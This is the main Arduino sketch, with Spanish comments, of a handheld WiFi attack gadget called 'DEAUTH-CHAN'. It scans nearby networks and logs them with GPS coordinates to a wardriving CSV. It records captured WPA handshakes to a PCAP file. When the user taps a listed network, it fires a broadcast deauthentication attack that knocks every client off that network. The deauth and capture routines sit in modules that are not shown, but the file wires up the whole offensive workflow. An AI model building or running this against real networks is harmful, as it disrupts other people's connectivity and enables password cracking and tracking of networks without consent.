#include <Arduino.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <SD.h>
#include "config.h"
#include "Mascota.h"
#include "WiFiHunter.h"
#include "PCAPWriter.h"
#include "GPSModule.h"

TFT_eSPI tft = TFT_eSPI();
XPT2046_Touchscreen touch(TOUCH_CS, TOUCH_IRQ);

Mascota mascota;
WiFiHunter hunter;
PCAPWriter pcap;
GPSModule gps;

RedInfo redes[20];
int numRedes = 0;
unsigned long lastScanTime = 0;

bool scanning = false;
unsigned long scanStartTime = 0;

int redSeleccionada = -1;
bool atacando = false;
unsigned long ataqueStartTime = 0;

ClienteInfo clientes[MAX_CLIENTES];
int numClientes = 0;
bool escaneandoClientes = false;
unsigned long clientScanStart = 0;

void onHandshakeCaptured(const uint8_t* frame, uint32_t len) {
    uint32_t ts = millis();
    pcap.writePacket(frame, len, ts/1000, (ts%1000)*1000);
    mascota.incrementarHandshakes();
    Serial.printf("Handshake capturado! %d bytes\n", len);
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("DEAUTH-CHAN v1.0");
    
    pinMode(TFT_LED_PIN, OUTPUT);
    digitalWrite(TFT_LED_PIN, HIGH);
    
    tft.init();
    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);
    
    touch.begin();
    mascota.init(&tft);
    
    if (pcap.begin("deauth")) {
        Serial.println("PCAP iniciado");
    }
    
    gps.begin();
    hunter.begin();
    hunter.setHandshakeCallback(onHandshakeCaptured);
    
    Serial.println("Setup completado");
}

void loop() {
    gps.update();
    hunter.processPendingHandshakes();
    mascota.update();
    mascota.dibujar();
    
    if (touch.touched()) {
        TS_Point p = touch.getPoint();
        int x = map(p.x, 0, 4095, 0, 240);
        int y = map(p.y, 0, 4095, 0, 320);
        
        if (mascota.getEstado() == ESTADO_IDLE && y > 200) {
            int indice = (y - 200) / 20;
            if (indice < numRedes) {
                redSeleccionada = indice;
                mascota.setEstado(ESTADO_ATTACK);
                
                // Atacar la red seleccionada (broadcast)
                hunter.deauth(redes[redSeleccionada], nullptr, 30);
                
                delay(100);
                mascota.setEstado(ESTADO_IDLE);
            }
        } else if (mascota.getEstado() == ESTADO_IDLE && y > 100 && y < 200) {
            // Zona para listar clientes (si están disponibles)
            // Esto es solo un placeholder
        } else {
            mascota.tocar(x, y);
        }
    }
    
    if (!scanning && millis() - lastScanTime > SCAN_INTERVAL) {
        mascota.setEstado(ESTADO_SCANNING);
        hunter.startScan();
        scanning = true;
        scanStartTime = millis();
    }
    
    if (scanning && hunter.isScanDone()) {
        hunter.getScanResults(redes, 20, numRedes);
        mascota.setRedesEncontradas(numRedes);
        
        GPSData pos = gps.getData();
        File csv = SD.open("/wardriving.csv", FILE_APPEND);
        if (csv) {
            for (int i = 0; i < numRedes; i++) {
                csv.printf("%s,%s,%02X:%02X:%02X:%02X:%02X:%02X,%d,%d,%.6f,%.6f,%.1f\n",
                    pos.valid ? pos.timestamp : "NO_FIX",
                    redes[i].ssid,
                    redes[i].bssid[0], redes[i].bssid[1], redes[i].bssid[2],
                    redes[i].bssid[3], redes[i].bssid[4], redes[i].bssid[5],
                    redes[i].rssi,
                    redes[i].canal,
                    pos.lat,
                    pos.lng,
                    pos.altitude
                );
            }
            csv.close();
        }
        
        mascota.setEstado(ESTADO_IDLE);
        scanning = false;
        lastScanTime = millis();
        Serial.printf("Escaneo completado: %d redes\n", numRedes);
    }
    
    delay(10);
}
